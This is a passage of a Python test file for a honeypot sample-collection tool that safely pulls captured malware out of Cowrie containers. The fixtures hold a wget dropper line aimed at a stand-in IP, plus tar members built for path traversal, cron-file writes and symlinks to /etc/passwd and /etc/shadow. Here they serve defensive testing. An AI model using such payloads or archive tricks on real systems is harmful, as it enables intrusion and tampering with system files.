def build_tar(members: list[dict[str, Any]]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        for m in members:
            info = tarfile.TarInfo(m["name"])
            kind = m.get("kind", "file")
            data = m.get("data", b"")
            info.mode = 0o644
            if kind == "file":
                info.size = len(data)
            elif kind == "symlink":
                info.type, info.linkname = tarfile.SYMTYPE, m["target"]
            elif kind == "hardlink":
                info.type, info.linkname = tarfile.LNKTYPE, m["target"]
            elif kind == "chardev":
                info.type, info.devmajor, info.devminor = tarfile.CHRTYPE, 1, 3
            elif kind == "fifo":
                info.type = tarfile.FIFOTYPE
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
            tar.addfile(info, io.BytesIO(data) if kind == "file" else None)
    return buffer.getvalue()


def archives(*, downloads=(), tty=()) -> dict[str, bytes]:
    """What `get_archive` returns for each directory: a tar rooted at that directory's name."""
    return {
        "downloads": build_tar([{"name": "downloads", "kind": "dir"}, *downloads]),
        "tty": build_tar([{"name": "tty", "kind": "dir"}, *tty]),
    }


class FakeContainer:
    def __init__(self, name: str, honeypot: str, tars: dict[str, Any], root: str) -> None:
        import docker.errors

        self._notfound = docker.errors.NotFound
        self.name = name
        self.id = f"id-{name}"
        self.status = "running"
        self.labels = {"honeypot-mcp": "true", "honeypot-name": honeypot}
        self.tars = {f"{root}/{category}": data for category, data in tars.items()}
        self.requested: list[str] = []
        self.error: Exception | None = None

    def get_archive(self, path: str):
        self.requested.append(path)
        if self.error is not None:
            raise self.error
        data = self.tars.get(path)
        if data is None:
            raise self._notfound(f"no such path {path}")
        if isinstance(data, bytes):
            return (data[i : i + 1500] for i in range(0, len(data), 1500)), {"name": path}
        return data, {"name": path}  # an already-built iterator


class FakeContainers:
    def __init__(self, client: FakeClient) -> None:
        self.client = client

    def list(self, all=False, filters=None):
        out = [c for c in self.client.items if c.status == (filters or {}).get("status", c.status)]
        if filters and "label" in filters:
            key, _, value = filters["label"].partition("=")
            out = [c for c in out if c.labels.get(key) == value]
        return out


class FakeClient:
    def __init__(self) -> None:
        self.items: list[FakeContainer] = []
        self.containers = FakeContainers(self)

    def add(self, name, tars, *, honeypot=None, root=COWRIE_ROOT) -> FakeContainer:
        container = FakeContainer(name, honeypot or name.removeprefix("honeypot-"), tars, root)
        self.items.append(container)
        return container


@pytest.fixture
def docker_client(monkeypatch):
    from honeypot_mcp import samples

    client = FakeClient()
    monkeypatch.setattr(samples, "_docker_client", lambda: client)
    return client


async def collect(honeypot: str | None = None) -> dict[str, Any]:
    from honeypot_mcp.tools.samples import sample_collect

    return await sample_collect(honeypot=honeypot)


def tree(root: Path) -> list[str]:
    return sorted(p.relative_to(root).as_posix() for p in root.rglob("*"))


SAMPLE_A = b"#!/bin/sh\nwget http://192.0.2.9/a\n"
SAMPLE_B = ELF_SAMPLES["mirai"][0]
TTY_A = struct.pack("<iLiiLL", 1, 3, 0, 0, 1_760_000_000, 5) + b"session one"
TTY_NAME = "20261016-000000-abc-0i.log"


def normal_archives() -> dict[str, bytes]:
    return archives(
        downloads=[
            {"name": "downloads/redir_0123", "data": SAMPLE_A},
            {"name": "downloads/anything", "data": SAMPLE_B},
        ],
        tty=[{"name": f"tty/{TTY_NAME}", "data": TTY_A}],
    )


async def test_collect_stores_files_by_hash_mode_000_with_sums_and_readme(docker_client):
    from honeypot_mcp import samples
    from honeypot_mcp.config import get_settings

    container = docker_client.add("honeypot-hp-ssh", normal_archives())
    result = await collect()
    root = get_settings().samples_dir
    assert result["new_files"] == 3 and result["duplicates_skipped"] == 0
    new = {f["path"]: f for h in result["honeypots"] for f in h["new"]}
    assert set(new) == {
        f"honeypot-hp-ssh/downloads/{sha(SAMPLE_A)}",
        f"honeypot-hp-ssh/downloads/{sha(SAMPLE_B)}",
        f"honeypot-hp-ssh/tty/{TTY_NAME}",
    }
    for rel in new:
        assert stat.S_IMODE((root / rel).stat().st_mode) == 0, rel
    assert stat.S_IMODE(root.stat().st_mode) == 0o700
    assert stat.S_IMODE((root / "honeypot-hp-ssh").stat().st_mode) == 0o700
    sums = (root / "SHA256SUMS").read_text().splitlines()
    assert f"{sha(SAMPLE_A)}  honeypot-hp-ssh/downloads/{sha(SAMPLE_A)}" in sums
    assert f"{sha(TTY_A)}  honeypot-hp-ssh/tty/{TTY_NAME}" in sums
    assert "LIVE MALWARE" in (root / "README.txt").read_text()
    assert stat.S_IMODE((root / "SHA256SUMS").stat().st_mode) == 0o600
    assert result["honeypots"][0]["downloads_new"] == 2 and result["honeypots"][0]["tty_new"] == 1
    # Only the paths the Docker guard allows are ever requested.
    from honeypot_mcp.engines.cowrie_limits import COWRIE_SAMPLE_DIRS

    assert set(container.requested) <= set(COWRIE_SAMPLE_DIRS) and container.requested
    assert samples.COLLECT_CATEGORIES == ("downloads", "tty")


async def test_collect_is_idempotent_and_never_overwrites(docker_client):
    from honeypot_mcp.config import get_settings

    container = docker_client.add("honeypot-hp-ssh", normal_archives())
    first = await collect()
    root = get_settings().samples_dir
    sums_before = (root / "SHA256SUMS").read_text()
    inodes = {p: p.stat().st_ino for p in root.rglob("*") if p.is_file()}
    second = await collect()
    assert first["new_files"] == 3
    assert second["new_files"] == 0 and second["duplicates_skipped"] == 3
    assert "Nothing new" in second["next_step"]
    assert (root / "SHA256SUMS").read_text() == sums_before
    assert {p: p.stat().st_ino for p in root.rglob("*") if p.is_file()} == inodes
    # A new file in the container is taken; the old ones are skipped.
    container.tars = {
        f"{COWRIE_ROOT}/downloads": archives(
            downloads=[
                {"name": "downloads/x", "data": SAMPLE_A},
                {"name": "downloads/y", "data": b"brand new"},
            ]
        )["downloads"]
    }
    third = await collect()
    assert third["new_files"] == 1 and third["duplicates_skipped"] == 1
    assert sha(b"brand new") in (root / "SHA256SUMS").read_text()


async def test_a_file_already_in_the_quarantine_is_never_replaced_even_without_a_sums_entry(
    docker_client,
):
    """A quarantine copied in from a backup has files and maybe no SHA256SUMS. The name is where
    the sample would go; what is there already must survive untouched."""
    from honeypot_mcp.config import get_settings

    docker_client.add(
        "honeypot-hp-ssh", archives(downloads=[{"name": "downloads/x", "data": SAMPLE_A}])
    )
    existing = put(f"honeypot-hp-ssh/downloads/{sha(SAMPLE_A)}", b"what was already here")
    inode = existing.stat().st_ino
    result = await collect()
    assert result["new_files"] == 0 and result["duplicates_skipped"] == 1
    assert existing.stat().st_ino == inode
    os.chmod(existing, 0o600)
    assert existing.read_bytes() == b"what was already here"
    assert not any(p.name.startswith(".collect-") for p in get_settings().samples_dir.rglob("*"))


async def test_a_changed_tty_recording_is_kept_beside_the_first_not_over_it(docker_client):
    from honeypot_mcp.config import get_settings

    container = docker_client.add(
        "honeypot-hp-ssh", archives(tty=[{"name": f"tty/{TTY_NAME}", "data": TTY_A}])
    )
    await collect()
    longer = TTY_A + b" and more"
    container.tars = {
        f"{COWRIE_ROOT}/tty": archives(tty=[{"name": f"tty/{TTY_NAME}", "data": longer}])["tty"]
    }
    again = await collect()
    directory = get_settings().samples_dir / "honeypot-hp-ssh" / "tty"
    assert again["new_files"] == 1
    assert sorted(p.name for p in directory.iterdir()) == [
        TTY_NAME,
        f"{TTY_NAME}.{sha(longer)[:12]}",
    ]


async def test_both_cowrie_state_roots_are_read(docker_client):
    """The compose stack mounts its volume on the second path; the image's own state directory
    is the first. Taking only the first that exists would miss everything there."""
    container = docker_client.add("honeypot-hp-ssh", {}, honeypot="hp-ssh")
    container.tars = {
        f"{COWRIE_ROOT}/downloads": archives(downloads=[{"name": "downloads/a", "data": b"one"}])[
            "downloads"
        ],
        "/cowrie/var/lib/cowrie/downloads": archives(
            downloads=[{"name": "downloads/b", "data": b"two"}]
        )["downloads"],
    }
    result = await collect()
    assert result["new_files"] == 2


HOSTILE = [
    {"name": "../escape", "data": b"owned"},
    {"name": "downloads/../../escape2", "data": b"owned"},
    {"name": "/etc/cron.d/owned", "data": b"owned"},
    {"name": "downloads/sub/nested", "data": b"nested"},
    {"name": "downloads/.hidden", "data": b"hidden"},
    {"name": "downloads/..", "data": b"dots"},
    {"name": "downloads/a\\b", "data": b"backslash"},
    {"name": "tty/link", "kind": "symlink", "target": "/etc/passwd"},
    {"name": "downloads/link2", "kind": "symlink", "target": "../../../../etc/shadow"},
    {"name": "downloads/hard", "kind": "hardlink", "target": "downloads/good"},
    {"name": "downloads/dev", "kind": "chardev"},
    {"name": "downloads/pipe", "kind": "fifo"},
    {"name": "tty/in-the-wrong-archive", "data": b"wrong category"},
    {"name": "downloads/good", "data": b"the only legitimate member"},
]


async def test_a_hostile_archive_cannot_write_outside_or_link_anything(docker_client, tmp_path):
    from honeypot_mcp.config import get_settings

    docker_client.add("honeypot-hp-ssh", archives(downloads=HOSTILE))
    root = get_settings().samples_dir
    before = set(tree(tmp_path))
    result = await collect()
    assert result["new_files"] == 1
    stored = [
        p for p in root.rglob("*") if p.is_file() and p.name not in ("SHA256SUMS", "README.txt")
    ]
    assert [p.name for p in stored] == [sha(b"the only legitimate member")]
    assert all(not p.is_symlink() for p in root.rglob("*"))
    created = set(tree(tmp_path)) - before
    assert all(c.split("/")[0] in ("samples", "reports", "yara-rules") for c in created), created
    assert not (tmp_path / "escape").exists() and not (tmp_path / "escape2").exists()
    skipped = result["honeypots"][0]["skipped"]
    assert skipped["not a regular file (link, device, FIFO or sparse)"] == 5
    assert skipped["unexpected path"] == 8


async def test_a_real_docker_cp_style_archive_of_a_messy_directory(docker_client, tmp_path):
    """The tar `docker cp` makes from a real directory with a symlink, a subdirectory, a FIFO and
    a dotfile in it, built by `tarfile.add` rather than by hand."""
    from honeypot_mcp.config import get_settings

    state = tmp_path / "state" / "downloads"
    state.mkdir(parents=True)
    (state / "real").write_bytes(SAMPLE_A)
    (state / ".gitignore").write_bytes(b"*\n")
    (state / "link").symlink_to("/etc/hostname")
    (state / "subdir").mkdir()
    (state / "subdir" / "inner").write_bytes(b"inner")
    os.mkfifo(state / "pipe")
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        tar.add(state, arcname="downloads")
    docker_client.add("honeypot-hp-ssh", {"downloads": buffer.getvalue()})
    result = await collect()
    assert result["new_files"] == 1
    assert (get_settings().samples_dir / "honeypot-hp-ssh" / "downloads" / sha(SAMPLE_A)).exists()
    skipped = result["honeypots"][0]["skipped"]
    assert skipped["unexpected path"] == 2  # the dotfile and the file below the subdirectory
    assert skipped["not a regular file (link, device, FIFO or sparse)"] == 2  # link and FIFO


async def test_collect_stops_at_the_file_and_byte_limits(docker_client, monkeypatch):
    from honeypot_mcp.config import get_settings

    settings = get_settings()
    container = docker_client.add(
        "honeypot-hp-ssh",
        archives(
            downloads=[
                {"name": f"downloads/f{i}", "data": f"content {i}".encode()} for i in range(10)
            ]
        ),
    )
    monkeypatch.setattr(settings, "sample_collect_max_files", 3)
    result = await collect()
    assert result["new_files"] == 3
    assert "SAMPLE_COLLECT_MAX_FILES" in result["honeypots"][0]["truncated"]
    # A member over the per-file cap is refused.
    monkeypatch.setattr(settings, "sample_collect_max_files", 100)
    monkeypatch.setattr(settings, "sample_max_mb", 1)
    container.tars = {
        f"{COWRIE_ROOT}/downloads": archives(
            downloads=[{"name": "downloads/big", "data": b"\x00" * ((1 << 20) + 1)}]
        )["downloads"]
    }
    big = await collect()
    assert big["new_files"] == 0
    assert big["honeypots"][0]["skipped"] == {"over the 1 MB size cap": 1}
    # Total bytes over the per-call cap stop the batch.
    monkeypatch.setattr(settings, "sample_collect_max_total_mb", 1)
    container.tars = {
        f"{COWRIE_ROOT}/downloads": archives(
            downloads=[{"name": f"downloads/r{i}", "data": os.urandom(400_000)} for i in range(10)]
        )["downloads"]
    }
    flood = await collect()
    assert flood["new_files"] == 2
    assert "per-call limit" in flood["honeypots"][0]["truncated"]


async def test_a_container_that_streams_without_end_is_cut_off(docker_client, monkeypatch):
    from honeypot_mcp.config import get_settings

    monkeypatch.setattr(get_settings(), "sample_collect_max_total_mb", 1)
    monkeypatch.setattr(get_settings(), "sample_max_mb", 1)
    header = tarfile.TarInfo("downloads/forever")
    header.size = 1 << 40  # declares a terabyte, then never stops sending
    served = []

    def endless():
        yield header.tobuf()
        while True:
            served.append(1)
            yield b"\x00" * (1 << 20)

    container = docker_client.add("honeypot-hp-ssh", {})
    container.tars = {f"{COWRIE_ROOT}/downloads": endless()}
    result = await asyncio.wait_for(collect(), timeout=30)
    assert result["new_files"] == 0
    assert "byte limit" in result["honeypots"][0]["truncated"]
    assert len(served) <= 12  # stopped reading at the cap (9 MB), not at the end of the stream


async def test_collect_filters_by_honeypot_and_reports_non_cowrie_containers(docker_client):
    docker_client.add("honeypot-hp-ssh", normal_archives(), honeypot="hp-ssh")
    docker_client.add("honeypot-hp-telnet", {}, honeypot="hp-telnet")  # no Cowrie directories
    one = await collect("hp-ssh")
    assert one["containers_checked"] == 1 and one["new_files"] == 3
    by_container = await collect("honeypot-hp-telnet")
    assert by_container["collected"] is False
    assert "not found in this container" in by_container["honeypots"][0]["error"]
    missing = await collect("hp-nope")
    assert "hp-nope" in missing["error"] and "Cowrie" in missing["hint"]
    bad = await collect("../etc")
    assert "not a valid honeypot name" in bad["error"]


async def test_a_refusal_by_the_docker_guard_says_what_to_change(docker_client):
    import docker.errors

    container = docker_client.add("honeypot-hp-ssh", normal_archives())
    container.error = docker.errors.APIError(
        "forbidden", response=SimpleNamespace(status_code=403, reason="x", text="x")
    )
    result = await collect()
    assert result["collected"] is False and result["new_files"] == 0
    assert "guard" in result["honeypots"][0]["error"]


async def test_collect_without_docker_or_containers_says_how_to_proceed(monkeypatch):
    from honeypot_mcp import samples

    def broken():
        raise samples.SampleError("Docker is not available (DockerException: x).", "Start Docker")

    monkeypatch.setattr(samples, "_docker_client", broken)
    result = await collect()
    assert result == {
        "error": "Docker is not available (DockerException: x).",
        "hint": "Start Docker",
    }
    monkeypatch.setattr(samples, "_docker_client", lambda: FakeClient())
    empty = await collect()
    assert "No running honeypot container" in empty["error"] and empty["hint"]


async def test_collect_in_analysis_mode_says_no_containers_exist(docker_client, monkeypatch):
    from honeypot_mcp.config import get_settings

    container = docker_client.add("honeypot-hp-ssh", normal_archives())
    monkeypatch.setattr(get_settings(), "analysis_mode", True)
    result = await collect()
    assert "analysis mode" in result["error"] and "no honeypot containers" in result["error"]
    assert container.requested == []


async def test_a_corrupt_archive_is_reported_for_that_container_only(docker_client):
    docker_client.add("honeypot-a", {"downloads": b"this is not a tar archive" * 100})
    docker_client.add("honeypot-b", normal_archives())
    result = await collect()
    by_name = {h["container"]: h for h in result["honeypots"]}
    assert by_name["honeypot-a"]["new_files"] == 0
    assert any("unreadable archive" in k for k in by_name["honeypot-a"]["skipped"])
    assert by_name["honeypot-b"]["new_files"] == 3
    assert result["collected"] is True


async def test_collect_is_audited(docker_client):
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import AuditLog

    docker_client.add("honeypot-hp-ssh", normal_archives())
    await collect("hp-ssh")
    async with get_session() as session:
        rows = (
            (await session.execute(select(AuditLog).where(AuditLog.tool == "sample_collect")))
            .scalars()
            .all()
        )
    assert len(rows) == 1 and rows[0].outcome == "ok" and "3 new" in rows[0].summary


async def test_what_collect_stores_is_what_scan_reads(docker_client, engine):
    body = TEXT_SAMPLES["reverse_shell"][0]
    docker_client.add(
        "honeypot-hp-ssh", archives(downloads=[{"name": "downloads/redir_1", "data": body}])
    )
    await collect()
    result = await scan(path="honeypot-hp-ssh")
    assert result["files_scanned"] == 1 and result["files_with_hits"] == 1
    assert result["top_files"][0]["path"] == f"honeypot-hp-ssh/downloads/{sha(body)}"


# ── resource bounds ──────────────────────────────────────────────────────────────────────────


def _tar_with_member(name: str, *, fmt: int, size: int = 1, pax: dict | None = None) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w", format=fmt) as tar:
        info = tarfile.TarInfo(name)
        info.size = size
        info.pax_headers = pax or {}
        tar.addfile(info, io.BytesIO(b"x" * size))
    return buffer.getvalue()


def _ingest(data: bytes, tmp_path: Path, *, piece: int = 4096):
    """Run `_ingest_tar` over `data` served in small chunks; returns (stream, collected)."""
    from honeypot_mcp import samples

    stream = samples._ByteStream((data[i : i + piece] for i in range(0, len(data), piece)), 1 << 30)
    collected = samples._Collected("c", "c")
    try:
        samples._ingest_tar(
            stream, "downloads", tmp_path / "hp", tmp_path, {}, collected, samples._Totals(),
            100, 1 << 30, 1 << 30,
        )  # fmt: skip
    finally:
        stream.close()
    return stream, collected


@pytest.mark.parametrize(
    ("fmt", "pax"),
    [(tarfile.GNU_FORMAT, None), (tarfile.PAX_FORMAT, {"comment": "z" * (3 << 20)})],
    ids=["gnu-long-name", "pax-record"],
)
def test_an_oversized_extended_header_is_refused_before_it_is_read(tmp_path, fmt, pax):
    """tarfile reads a long-name or PAX header at whatever size the archive declares, and copies it
    several times: a 40 MB one peaked ~180 MB above baseline (a 512 MB cap would mean ~2.5 GB). The
    declared size is refused after the 512-byte header, so almost none of it is pulled in."""
    name = "downloads/" + ("n" * (3 << 20) if pax is None else "f")
    data = _tar_with_member(name, fmt=fmt, pax=pax)
    assert len(data) > 3 << 20

    from honeypot_mcp import samples

    stream = samples._ByteStream((data[i : i + 4096] for i in range(0, len(data), 4096)), 1 << 30)
    try:
        with pytest.raises(tarfile.ReadError, match="oversized extended header"):
            samples._ingest_tar(
                stream, "downloads", tmp_path / "hp", tmp_path, {}, samples._Collected("c", "c"),
                samples._Totals(), 100, 1 << 30, 1 << 30,
            )  # fmt: skip
    finally:
        stream.close()
    assert stream.received < 100_000, f"{stream.received} bytes were pulled in"


def test_an_ordinary_long_name_and_pax_record_still_parse(tmp_path):
    long_name = "downloads/" + "n" * 300  # beyond the 100-byte ustar field: a GNU long-name header
    stream, collected = _ingest(_tar_with_member(long_name, fmt=tarfile.GNU_FORMAT), tmp_path)
    assert collected.skipped == {"unexpected path": 1}  # parsed, then refused as a name
    stream, collected = _ingest(
        _tar_with_member("downloads/ok", fmt=tarfile.PAX_FORMAT, pax={"comment": "x" * 2000}),
        tmp_path,
    )
    assert len(collected.new) == 1


def test_a_gnu_sparse_member_is_refused_without_expanding_its_map(tmp_path):
    from honeypot_mcp import samples

    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w", format=tarfile.GNU_FORMAT) as tar:
        info = tarfile.TarInfo("downloads/sparse")
        info.size = 1
        tar.addfile(info, io.BytesIO(b"x"))
    block = bytearray(buffer.getvalue()[:512])
    block[156:157] = tarfile.GNUTYPE_SPARSE  # retype the header as a GNU sparse member
    block[148:156] = b" " * 8  # the checksum is summed with its own field as spaces
    block[148:156] = b"%06o\0 " % sum(block)
    data = bytes(block) + buffer.getvalue()[512:]
    stream = samples._ByteStream(iter([data]), 1 << 20)
    try:
        with pytest.raises(tarfile.ReadError, match="sparse"):
            samples._ingest_tar(
                stream, "downloads", tmp_path / "hp", tmp_path, {}, samples._Collected("c", "c"),
                samples._Totals(), 100, 1 << 20, 1 << 20,
            )  # fmt: skip
    finally:
        stream.close()


def test_a_member_is_read_in_pieces_and_stored_intact(tmp_path, monkeypatch):
    from honeypot_mcp import samples

    monkeypatch.setattr(samples, "_READ_CHUNK", 1000)
    body = os.urandom(10_500)
    _stream, empty = _ingest(
        _tar_with_member("downloads/x", fmt=tarfile.PAX_FORMAT, size=0), tmp_path
    )
    assert empty.new[0]["size"] == 0  # an empty member is still stored
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        info = tarfile.TarInfo("downloads/y")
        info.size = len(body)
        tar.addfile(info, io.BytesIO(body))
    (tmp_path / "second").mkdir()
    _stream, collected = _ingest(buffer.getvalue(), tmp_path / "second")
    assert collected.new[0]["sha256"] == sha(body) and collected.new[0]["size"] == len(body)
    stored = tmp_path / "second" / "hp" / "downloads" / sha(body)
    os.chmod(stored, 0o600)
    assert stored.read_bytes() == body


def test_a_byte_stream_never_returns_more_than_its_read_ceiling():
    """Whatever size a caller asks for (or -1), a read is bounded, so one call cannot buffer the
    whole per-call cap and copy it again; short reads hand back every byte in order."""
    from honeypot_mcp import samples

    data = os.urandom(samples._MAX_READ * 3 + 17)
    stream = samples._ByteStream(iter([data]), 1 << 30)
    try:
        sizes, got = [], b""
        for ask in (-1, 1 << 40, 5, 1 << 20, -1, -1):
            piece = stream.read(ask)
            sizes.append(len(piece))
            got += piece
        assert max(sizes) == samples._MAX_READ and sizes[:2] == [samples._MAX_READ] * 2
        while piece := stream.read(1 << 40):
            got += piece
        assert got == data
    finally:
        stream.close()


def test_a_stalled_stream_gives_up_at_the_deadline_even_while_the_socket_read_blocks():
    """The Docker SDK turns the socket timeout off, so a peer that goes quiet blocks the read for
    ever; the wait for the next chunk must not be that read."""
    import threading
    import time

    from honeypot_mcp import samples

    stall = threading.Event()

    def quiet():
        yield b"a" * 100
        stall.wait(30)  # the peer sends nothing more
        yield b"b"

    stream = samples._ByteStream(quiet(), 1 << 20, deadline=time.monotonic() + 0.5)
    try:
        assert stream.read(10) == b"a" * 10
        assert stream.read(1000) == b"a" * 90, "what has arrived is returned, not held back"
        started = time.monotonic()
        with pytest.raises(samples._DeadlineExceeded):
            stream.read(1000)
        assert time.monotonic() - started < 3
    finally:
        stall.set()
        stream.close()


def test_a_stream_error_reaches_the_reader_and_end_of_stream_is_sticky():
    from honeypot_mcp import samples

    def broken():
        yield b"ok"
        raise ConnectionError("peer reset")

    stream = samples._ByteStream(broken(), 1 << 20)
    try:
        assert stream.read(2) == b"ok"
        with pytest.raises(ConnectionError):
            stream.read(1)
        assert stream.read(1) == b""
    finally:
        stream.close()
    done = samples._ByteStream(iter([b"x"]), 1 << 20)
    assert done.read(10) == b"x" and done.read(10) == b"" and done.read(10) == b""
    done.close()


async def test_collect_gives_up_on_a_stalled_container_and_frees_the_lock(
    docker_client, monkeypatch
):
    """A container that goes quiet held `_COLLECT_LOCK` and a worker thread for as long as it
    liked (the SDK disables the socket timeout). Now the call ends at its deadline, keeps what
    arrived, says so, and the next call can run."""
    import threading
    import time

    from honeypot_mcp import samples
    from honeypot_mcp.config import get_settings

    monkeypatch.setattr(get_settings(), "sample_collect_deadline_seconds", 1)
    stall = threading.Event()
    good = tarfile.TarInfo("downloads/first")
    good.size = 4
    head = good.tobuf() + b"data" + b"\0" * 508  # one whole member, then silence

    def drip():
        yield head
        stall.wait(30)
        yield b"never"

    container = docker_client.add("honeypot-hp-ssh", {})
    container.tars = {f"{COWRIE_ROOT}/downloads": drip()}
    started = time.monotonic()
    try:
        result = await asyncio.wait_for(collect(), timeout=20)
        elapsed = time.monotonic() - started
        assert elapsed < 8, f"a 1 s deadline took {elapsed:.1f}s"
        entry = result["honeypots"][0]
        assert "time limit" in entry["truncated"], entry
        assert entry["new_files"] == 1, "what arrived before the deadline is kept"
        assert not samples._COLLECT_LOCK.locked()
    finally:
        stall.set()
    container.tars = {f"{COWRIE_ROOT}/downloads": normal_archives()["downloads"]}
    again = await asyncio.wait_for(collect(), timeout=20)
    assert again["new_files"] >= 1


def test_the_collect_deadline_setting_has_a_default_and_bounds():
    from pydantic import ValidationError

    from honeypot_mcp.config import Settings

    assert Settings().sample_collect_deadline_seconds == 300
    for bad in (0, 4, 3601):
        with pytest.raises(ValidationError):
            Settings(sample_collect_deadline_seconds=bad)


async def test_a_swap_for_a_symlink_after_the_inspection_never_chmods_the_target(
    engine, tmp_path, monkeypatch
):
    """`read_sample` grants itself read on a mode-000 file with a *path* chmod. A swap for a
    symlink between its `lstat` and that chmod made the chmod follow the link and change the mode
    of whatever it pointed at (and the failure path then set it to the original file's mode)."""
    from honeypot_mcp import samples

    path = put("victim", BENIGN, mode=0o000)
    target = tmp_path / "elsewhere.txt"
    target.write_bytes(b"not a sample")
    os.chmod(target, 0o640)
    real_open = os.open
    calls = []

    def swapping_open(p, flags, *args, **kwargs):
        calls.append(p)
        if len(calls) == 1:
            os.unlink(path)
            os.symlink(target, path)
            raise PermissionError(13, "Permission denied")
        return real_open(p, flags, *args, **kwargs)

    monkeypatch.setattr(samples, "os", _OsProxy(open=swapping_open))
    with pytest.raises(samples.SkipFile):
        samples.read_sample(path, 1 << 20)
    assert stat.S_IMODE(target.stat().st_mode) == 0o640, "the link's target must be left alone"
